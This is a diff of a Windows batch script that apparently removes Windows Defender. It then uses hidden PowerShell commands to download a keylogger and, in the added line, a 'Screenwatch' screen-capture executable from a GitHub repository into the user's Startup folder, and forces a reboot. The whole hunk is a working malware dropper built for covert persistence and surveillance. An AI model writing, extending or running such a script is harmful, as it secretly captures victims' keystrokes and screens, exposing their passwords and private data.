@@ -40,7 +40,7 @@ defender_remover.exe Y
 
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/keylogger.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe\""
-
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/Screenwatch.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Screenwatch.exe\""
 timeout /t 60
 
 shutdown /r
